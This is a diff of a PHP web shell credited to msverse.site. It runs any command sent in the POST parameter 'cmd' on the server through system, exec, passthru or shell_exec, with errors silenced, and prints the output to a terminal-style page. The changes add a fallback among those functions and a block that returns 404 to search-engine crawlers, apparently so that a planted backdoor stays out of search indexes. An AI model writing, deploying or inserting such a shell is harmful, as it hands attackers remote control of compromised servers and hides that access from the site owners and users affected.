@@ -1,27 +1,45 @@
 <?php
 // author: msverse.site
 // website: https://www.msverse.site
-// jangan diedit
-if (isset($_POST['cmd'])) {
-    $output = '';
+// command
+function exe($cmd) {
     if (function_exists('system')) {
-        ob_start();
-        system($_POST['cmd']);
-        $output = ob_get_contents();
-        ob_end_clean();
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    } elseif (function_exists('exec')) {
+        @exec($cmd, $results);
+        $buff = "";
+        foreach ($results as $result) {
+            $buff .= $result . "\n";
+        }
+        return $buff;
+    } elseif (function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        return $buff;
+    } elseif (function_exists('shell_exec')) {
+        $buff = @shell_exec($cmd);
+        return $buff;
     }
-    if (function_exists('exec')) {
-        exec($_POST['cmd'], $output);
-        $output = implode("\n", $output);
-    }
-    if (function_exists('passthru')) {
-        ob_start();
-        passthru($_POST['cmd']);
-        $output = ob_get_contents();
-        ob_end_clean();
-    }
-    if (function_exists('shell_exec')) {
-        $output = shell_exec($_POST['cmd']);
+}
+
+$output = '';
+
+if (isset($_POST['cmd'])) {
+    $output = exe($_POST['cmd']);
+}
+
+// blokir mesin pencarian
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
     }
 }
 ?>
@@ -99,12 +117,12 @@ text-align: center;
     </div>
     <!-- end -->
     
-    <?php if (isset($output)) : ?>
+    <?php if (!empty($output)) : ?>
         <pre><?php echo $output; ?></pre>
     <?php endif; ?>
     
     <div class="footer">
-         <p>Copyright : <a href	="https://www.msverse.site/" alt="Terminal" target="_blank"/>msverse.site</a></p>
+         <p>Copyright : <a href="https://www.msverse.site/" alt="Terminal" target="_blank">msverse.site</a></p>
     </div>
 </body>
 </html>
